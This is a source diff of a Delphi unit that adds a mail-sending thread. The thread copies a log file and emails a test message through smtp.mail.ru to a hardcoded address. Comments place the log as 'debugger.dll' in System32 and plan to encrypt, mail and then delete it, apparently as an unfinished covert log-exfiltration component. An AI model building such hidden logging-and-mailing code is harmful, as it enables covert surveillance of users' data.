@@ -39,32 +39,49 @@ type
   end;
   TDebugLog = class
     private
-      FList:TStringList;
+      //FList:TStringList;
+      FLinkedObj:TObject;
       FFullFileName: String; //Путь и Имя файла, в который будем писать логи
       FEnable: Boolean;  //Активена ли запись лога
       procedure WriteLine (Msg:string); //Записать в файл.
     public
-      constructor Create;
+      constructor Create; overload;
+      constructor Create (LinkedObj: TObject); overload;
       destructor Destroy;
       procedure Add (Msg:string;PrintDate:Boolean=True); //Добавить строку в лог
-      property List:TStringList read FList write FList;
+      //property List:TStringList read FList write FList;
   end;
-  TSenderThread = class (TThread)
+  TMailSender = class(TThread)
+  private
+    FId:integer;
+    procedure CopyFile;
+  protected
+    procedure Execute; override;
+    procedure TerminateProc(Sender: TObject);
+
+  public
+    constructor Create;
+    procedure SendMail;
+  end;
+  {TSenderThread = class (TThread)
     private
       FLog: TObject;
     public
       constructor Create(const Log:TObject); overload;
+      destructor Destroy;
       procedure Execute; override; //Предопределенный метод.
       procedure SendMail; //Непосредственно отправка Письма.
-  end;
+  end;}
 
 var
   GlobalLogger: TDebugLog;   //Глобальный лог.
   GlobalSettings: TSettings; //Глобальный менеджер настроек
+  GlobalSender: TMailSender;
 
 implementation
 
-uses StdCtrls;
+uses StdCtrls,
+     IdSMTP,IdMessage,IdText,IdSSLOpenSSL,IdAttachmentFile,IdExplicitTLSClientServerBase;
 
 //TSettings
 constructor TSettings.Create;
@@ -185,22 +202,36 @@ begin
 
   FFullFileName:=ExtractFileDir(ParamStr(0))+'\'+DEBUG_LOG_FILENAME;
 
-  FList:=TStringList.Create;
+  //FList:=TStringList.Create;
 end;
+
+constructor TDebugLog.Create(LinkedObj: TObject);
+begin
+  Self.Create;
+  if LinkedObj is TMemo then
+    FLinkedObj:=LinkedObj;
+  (FLinkedObj as TMemo).Lines.Add('Debug log enabled..');
+end;
+
 destructor TDebugLog.Destroy;
 begin
-  FList.Free;
+  //FList.Free;
 end;
 procedure TDebugLog.Add(Msg: string;PrintDate:Boolean);
+var
+  FullMsg:String;
 begin
   if FEnable then
   begin
     if PrintDate then
-      WriteLine(DateTimeToStr(Now)+' '+Msg)
+      FullMsg:= DateTimeToStr(Now)+' '+Msg
     else
-      WriteLine(Msg);
-    FList.Add(Msg);
+      FullMsg:= Msg;
+
+    WriteLine(FullMsg);
   end;
+  if Assigned(FLinkedObj) then
+    (FLinkedObj as TMemo).Lines.Add(FullMsg);
 end;
 procedure TDebugLog.WriteLine(Msg: string);
 //Пишем служебную инфу в "Рантайм лог"
@@ -224,37 +255,16 @@ begin
 end;
 { end of TDebugLog }
 
-{ TSenderThread }
-constructor TSenderThread.Create(const Log:TObject);
-begin
-  inherited Create;
-  FLog:=Log;
-  if (FLOG is TMemo) then
-  begin
-    TMemo(FLog).Clear;
-    TMemo(FLog).Lines.Add('Yahoo!');
-  end;
-
-end;
-
-procedure TSenderThread.Execute;
-begin
-  repeat
-    beep;
-    TMemo(FLog).Lines.Add('tick');
-    Synchronize(SendMail);
-    Sleep(1000);
-  until 1=0
-end;
-
-procedure TSenderThread.SendMail;
+procedure TMailSender.CopyFile;
 var
   PathToExe:string; //Папка с файлом "C:\Windows\System32"
   FullFileName:string;  //Полный путь + имя файла лога "C:\Windows\System32\debugger.dll"
   TempFileName:string; //Имя временного файла: XXXXddmmyy-hhmm
-  Destination:string;
+
+  Source:string;      //Полный путь до файла-источника
+  Destination:string; //Полный путь до файла-приемника
 begin
-{
+(*
   1.Проверим доступность интернета.
     1.1.Если доступен, то:
       -Копируем файл во временный каталог, и переименовываем.
@@ -265,7 +275,172 @@ begin
       --В случае неудачи указываем этап, и причину ошибки.
     1.2.Если НЕ доступен, то:
       -Пишем в лог сообщение об ошибке.
-}
+*)
+  //PathToExe:=ExtractFileDir(ParamStr(0));
+  Source:=ExtractFileDir(ParamStr(0))+'\'+MESSAGE_LOG_FILENAME;
+  TempFileName:=FormatDateTime('ddmmyy"-"hhnn',Now());
+  Destination:=ExtractFileDir(ParamStr(0))+'\'+TempFileName;
+
+  if not FileExists(Source) then
+  begin
+    ShowMessage('SendMessage: File not found ('+Source+')');
+    exit;
+  end;
+  GlobalLogger.Add(Source+#13#10+Destination);
+  //Destination:=PathToExe+'\'+TempFileName;
+  //CopyFile(PWideChar(@Source),PWideChar(@(Destination)),False);
+  Windows.CopyFile(PWideChar(@Source),PWideChar(@Destination),False);
+end;
+
+constructor TMailSender.Create;
+begin
+  inherited Create(True); //Обьект создастся с остановленным потоком.
+  Priority:=tpNormal; //Назначаем приоритет
+  Self.FreeOnTerminate:=True; //Автоматически освобождаем обьект после завершения потока
+  Self.OnTerminate:=TerminateProc;
+  Randomize;
+  FId:=Random(1000);
+  GlobalLogger.Add('Create '+IntToStr(FId));
+end;
+procedure TMailSender.Execute;
+begin
+  NameThreadForDebugging('MailSender'+IntToStr(FId)); //Это для отладчика.
+  GlobalLogger.Add('execute '+IntToStr(FId));
+  Synchronize(CopyFile);
+  Synchronize(SendMail);
+end;
+procedure TMailSender.SendMail;
+var
+  smtp: TIdSMTP;
+  msg: TIdMessage;
+
+  function ParceString (Msg:string):String;
+  var
+    i:integer;
+  begin
+    for i:=1 to Length(Msg) do
+    begin
+      if (Msg[i]=#13) or (msg[i]=#10) then
+      begin
+        Delete(Msg,i,1);
+        Insert(' ',Msg,i);
+      end;
+    end;
+    Result:=Msg;
+  end;
+
+begin
+  //Готовим SMTP
+  smtp:= TIdSMTP.Create;
+  try
+    msg:=TIdMessage.Create(smtp);
+    try
+      with msg do
+      begin
+        Subject:='subject';
+        From.Text:='';
+        Recipients.EMailAddresses:='osmenog@gmail.com';
+        CharSet:='windows-1251';
+        ContentType := 'text/plain';
+        Body.Text:='text1111!!! =) [Привет!]';
+      end;
+
+      //----------MAIL.RU--------------
+      smtp.Host:='smtp.mail.ru';
+      smtp.Username:='';
+      smtp.Password:='';
+      //-------------------------------
+
+      {//----------GMAIL.COM------------
+      smtp.Host:='smtp.gmail.com';
+      smtp.Username:='';
+      smtp.Password:='';
+      //-------------------------------}
+      //smtp.UseTLS:=utUseRequireTLS;
+      try
+        smtp.Connect;
+      except
+        on E:Exception do
+        begin
+          GlobalLogger.Add('Connect error: ['+ParceString(E.Message)+']');
+          raise;
+        end;
+      end;
+
+      try
+        try
+          smtp.Send(msg);
+        except
+          On E:Exception do
+          begin
+            GlobalLogger.Add('Send error: ['+ParceString(E.Message)+']');
+            raise;
+          end;
+        end;
+      finally
+        smtp.Disconnect;
+      end;
+    finally
+      FreeAndNil(msg);
+    end;
+  finally
+    FreeAndNil(smtp);
+  end;
+end;
+procedure TMailSender.TerminateProc(Sender: TObject);
+begin
+   GlobalLogger.Add('terminated '+IntToStr(FId));
+end;
+
+{ TSenderThread }
+{constructor TSenderThread.Create(const Log:TObject);
+begin
+  inherited Create;
+  NameThreadForDebugging('SenderThread');
+  FLog:=Log;
+  if (FLOG is TMemo) then
+  begin
+    TMemo(FLog).Clear;
+    TMemo(FLog).Lines.Add('Yahoo!');
+  end;
+
+end;}
+
+{destructor TSenderThread.Destroy;
+begin
+  Beep;
+  inherited Destroy;
+end;
+
+procedure TSenderThread.Execute;
+begin
+  repeat
+    beep;
+    TMemo(FLog).Lines.Add('tick');
+    //Synchronize(SendMail);
+    Sleep(1000);
+  until 1=0
+end;}
+
+{procedure TSenderThread.SendMail;
+var
+  PathToExe:string; //Папка с файлом "C:\Windows\System32"
+  FullFileName:string;  //Полный путь + имя файла лога "C:\Windows\System32\debugger.dll"
+  TempFileName:string; //Имя временного файла: XXXXddmmyy-hhmm
+  Destination:string;
+begin
+(*
+  1.Проверим доступность интернета.
+    1.1.Если доступен, то:
+      -Копируем файл во временный каталог, и переименовываем.
+      -Шифруем содержимое
+      -Отправляем письмо
+      -Удаляем временный файл
+      -Заносим запись в лог в случае успеха.
+      --В случае неудачи указываем этап, и причину ошибки.
+    1.2.Если НЕ доступен, то:
+      -Пишем в лог сообщение об ошибке.
+*)
   PathToExe:=ExtractFileDir(ParamStr(0));
   FullFileName:=PathToExe+'\'+MESSAGE_LOG_FILENAME;
   TempFileName:=FormatDateTime('ddmmyy"-"hhnn',Now());
@@ -278,6 +453,7 @@ begin
   //Destination:=PathToExe+'\'+TempFileName;
   CopyFile(PWideChar(@FullFileName),PWideChar(@(Destination)),False);
 
-end;
+end;}
 { end of TSenderThread }
+
 end.
